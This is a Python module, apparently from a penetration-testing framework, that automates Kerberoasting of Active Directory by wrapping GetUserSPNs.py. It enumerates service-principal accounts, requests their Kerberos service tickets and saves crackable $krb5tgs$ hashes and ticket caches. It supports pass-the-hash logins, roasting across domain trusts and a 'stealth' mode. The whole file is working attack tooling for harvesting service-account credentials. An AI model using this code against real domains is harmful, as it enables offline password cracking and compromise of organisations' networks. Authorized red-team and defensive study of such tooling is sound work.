import os
import re
import shlex
from pathlib import Path
from uuid import uuid4

from auth_manager import EMPTY_LM_HASH
from module import BaseModule
from tool import Tool


class Kerberoast(BaseModule):
    path = "kerberos/kerberoast"
    description = "Roast SPN-bearing accounts with focused or broad targeting."
    info = """Requests Kerberos service tickets (TGS) for SPN-bearing accounts and saves crackable hashes.

Common usage:
  - Leave `target_account` and `targets_file` empty to enumerate and roast all SPN-bearing user accounts.
  - Set `target_account` for one or more specific usernames.
  - Set `target_domain` to roast across a trust using the current auth domain credentials.

Notes:
  - `password` is only required when `auth=ntlm`.
  - `save_tickets=Yes` also saves per-user `.ccache` files in `logs/`.
  - `stealth=Yes` relaxes the LDAP SPN filter and may be expensive on large domains."""
    options = {
        "dc_ip": {
            "default": "",
            "description": "DC IP. If blank, the auth domain FQDN is used/resolved.",
            "required": False,
        },
        "dc_host": {
            "default": "",
            "description": "Optional DC hostname override for GetUserSPNs.",
            "required": False,
        },
        "domain": {
            "default": "",
            "description": "Auth: Domain name (FQDN)",
            "required": True,
        },
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {
            "default": "",
            "description": "Auth: Password or NT Hash (for NTLM auth only)",
            "required": False,
        },
        "auth": {
            "default": "ntlm",
            "description": "Auth: Type (ntlm, krb)",
            "required": True,
        },
        "target_domain": {
            "default": "",
            "description": "Optional target domain to roast if different from auth domain",
            "required": False,
        },
        "target_account": {
            "default": "",
            "description": "Target account(s) to roast (empty = enumerate all, accepts comma/space-separated names)",
            "required": False,
        },
        "targets_file": {
            "default": "",
            "description": "Optional local file with one target username per line",
            "required": False,
        },
        "stealth": {
            "default": "No",
            "description": "Relax LDAP SPN filtering for stealthier but heavier enumeration",
            "required": False,
            "boolean": True,
        },
        "save_tickets": {
            "default": "No",
            "description": "Also save requested TGS tickets as `.ccache` files",
            "required": False,
            "boolean": True,
        },
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    def _normalize_target(self, raw_value: str) -> str:
        value = (raw_value or "").strip()
        if not value:
            return ""
        if "/" in value:
            value = value.rsplit("/", 1)[-1]
        if "\\" in value:
            value = value.rsplit("\\", 1)[-1]
        if "@" in value:
            value = value.split("@", 1)[0]
        return value

    def _collect_targets(self) -> list[str] | None:
        targets = []

        raw_target_account = (self.opts.target_account or "").strip()
        if raw_target_account:
            for candidate in re.split(r"[\s,]+", raw_target_account):
                normalized = self._normalize_target(candidate)
                if normalized:
                    targets.append(normalized)

        raw_targets_file = (self.opts.targets_file or "").strip()
        if raw_targets_file:
            targets_path = Path(raw_targets_file).expanduser()
            if not targets_path.is_file():
                self.pane_a.write(
                    f"[red][!] Targets file not found: {raw_targets_file}[/red]"
                )
                return None

            for line in targets_path.read_text(encoding="utf-8").splitlines():
                normalized = self._normalize_target(line)
                if normalized and not normalized.startswith("#"):
                    targets.append(normalized)

        deduped = []
        seen = set()
        for target in targets:
            lowered = target.lower()
            if lowered in seen:
                continue
            seen.add(lowered)
            deduped.append(target)

        return deduped

    def _build_output_file(self, roast_domain: str, targets: list[str]) -> Path:
        safe_domain = re.sub(r"[^A-Za-z0-9._-]", "_", roast_domain.lower())
        if not targets:
            suffix = "all"
        elif len(targets) == 1:
            suffix = re.sub(r"[^A-Za-z0-9._-]", "_", targets[0].lower())
        else:
            suffix = f"{len(targets)}targets"

        return Path(self.logs_dir) / f"kerberoast_{safe_domain}_{suffix}.txt"

    def _build_auth_target(self, include_password: bool = True) -> str:
        if self.opts.auth == "krb":
            return f"{self.opts.domain}/{self.opts.username}"

        if include_password:
            return f"{self.opts.domain}/{self.opts.username}:{self.opts.password}"

        return f"{self.opts.domain}/{self.opts.username}"

    def _build_command(
        self, output_file: Path, roast_domain: str, targets: list[str], tool: Tool
    ) -> tuple[list[str], Path | None] | None:
        if not tool.set_auth(from_module=True):
            return None

        command_parts = [
            "../tools/.bin/GetUserSPNs.py",
            "-request",
            "-outputfile",
            str(output_file),
        ]

        if self.opts.target_domain:
            command_parts += ["-target-domain", self.opts.target_domain]
        else:
            command_parts += ["-target-domain", self.opts.domain]

        if self.opts.stealth == "Yes":
            command_parts.append("-stealth")
        if self.opts.save_tickets == "Yes":
            command_parts.append("-save")
        if self.opts.dc_ip:
            command_parts += ["-dc-ip", self.opts.dc_ip]

        dc_host = (self.opts.dc_host or getattr(self.opts, "dc_hostname", "")).strip()
        if dc_host:
            command_parts += ["-dc-host", dc_host]

        if self.opts.auth == "krb":
            command_parts += ["-k", "-no-pass", self._build_auth_target()]
        elif tool.is_nt_hash(self.opts.password):
            command_parts += [
                "-hashes",
                f"{EMPTY_LM_HASH}:{self.opts.password.strip(':')}",
                self._build_auth_target(include_password=False),
            ]
        else:
            command_parts.append(self._build_auth_target())

        if not targets:
            return command_parts, None

        if len(targets) == 1:
            command_parts[1:1] = ["-request-user", targets[0]]
            return command_parts, None

        temp_targets_file = (
            Path(self.logs_dir) / f"kerberoast_targets_{uuid4().hex[:8]}.txt"
        )
        temp_targets_file.write_text("\n".join(targets) + "\n", encoding="utf-8")
        command_parts[1:1] = ["-usersfile", str(temp_targets_file)]
        return command_parts, temp_targets_file

    async def _run_and_capture(self, command_parts: list[str]) -> list[str]:
        captured = []
        async for line in self.run_command(shlex.join(command_parts), self.pane_b):
            lower = line.lower()
            if line.startswith("$krb5tgs$"):
                line = f"[green]{line}[/green]"
            elif "no entries found" in lower:
                line = f"[yellow]{line}[/yellow]"
            elif "timed out" in lower or "connection refused" in lower:
                line = f"[yellow]{line}[/yellow]"
            elif "traceback (most recent call last):" in lower:
                line = f"[red]{line}[/red]"
            elif "logging.critical" in lower or "error(" in lower:
                line = f"[red]{line}[/red]"

            self.pane_b.write(line)
            captured.append(line)

        return captured

    def _count_hashes(self, output_file: Path) -> int:
        if not output_file.is_file():
            return 0

        return sum(
            1
            for line in output_file.read_text(encoding="utf-8", errors="replace").splitlines()
            if line.startswith("$krb5tgs$")
        )

    def _summarize(self, roast_domain: str, targets: list[str], output_file: Path, lines: list[str]):
        hash_count = self._count_hashes(output_file)
        raw_output = "\n".join(lines)
        log_path = self.write_unique_log(raw_output, f"kerberoast_{roast_domain}")

        if log_path:
            self.pane_a.write(f"✓ Saved Kerberoast command output to `{log_path.name}`")

        if output_file.is_file():
            self.pane_a.write(f"✓ Saved Kerberoast hashes to `{output_file.name}`")

        if hash_count:
            self.pane_a.write(
                f"[green]✓ Captured {hash_count} Kerberoast hash line(s).[/green]"
            )
        elif targets:
            self.pane_a.write(
                f"[yellow][!] No Kerberoast hashes were returned for {len(targets)} requested target(s).[/yellow]"
            )
        else:
            self.pane_a.write(
                "[yellow][!] No roastable SPN-bearing user accounts were returned.[/yellow]"
            )

        if self.opts.save_tickets == "Yes":
            self.pane_a.write(
                "[cyan]Info:[/cyan] Requested TGS tickets were also saved as `.ccache` files under `logs/`."
            )

    async def run(self):
        if not self.validate_options():
            return

        targets = self._collect_targets()
        if targets is None:
            return

        roast_domain = (self.opts.target_domain or self.opts.domain).strip()
        tool = Tool(self)
        tool.set_output_pane(self.pane_b)

        os.chdir(self.logs_dir)
        output_file = self._build_output_file(roast_domain, targets)
        output_file.parent.mkdir(parents=True, exist_ok=True)

        if targets:
            self.pane_b.write(
                f"[cyan]Step 1: Request Kerberoast hashes for {len(targets)} specified target account(s)[/cyan]"
            )
        elif self.opts.target_domain:
            self.pane_b.write(
                f"[cyan]Step 1: Enumerate and roast SPN-bearing accounts in trusted target domain `{self.opts.target_domain}`[/cyan]"
            )
        else:
            self.pane_b.write(
                "[cyan]Step 1: Enumerate and roast SPN-bearing accounts in the current domain[/cyan]"
            )

        built = self._build_command(output_file, roast_domain, targets, tool)
        if not built:
            return

        command_parts, temp_targets_file = built
        try:
            lines = await self._run_and_capture(command_parts)
        finally:
            if temp_targets_file is not None:
                temp_targets_file.unlink(missing_ok=True)

        self._summarize(roast_domain, targets, output_file, lines)
